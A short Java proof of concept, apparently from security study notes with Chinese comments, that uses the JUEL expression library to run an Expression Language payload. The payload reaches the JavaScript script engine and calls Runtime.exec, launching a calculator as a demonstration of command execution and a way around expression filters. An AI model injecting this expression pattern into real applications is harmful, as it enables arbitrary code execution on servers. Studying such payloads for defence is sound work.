package Bypass;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

public class ScriptEngineExec {
    public static void main(String[] args) throws Exception {
        // 创建 EL 表达式工厂和上下文
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();

        // 注册 Class
        simpleContext.setVariable("Class",
                expressionFactory.createValueExpression(Class.class, Class.class));

        // 构造 EL 表达式
        String exp = "${Class.forName(\"javax.script.ScriptEngineManager\").newInstance()"
                + ".getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('/usr/bin/gnome-calculator'); 'Executed'\")}";

        // 创建并解析表达式
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        // 输出结果
        System.out.println(valueExpression.getValue(simpleContext));
    }
}
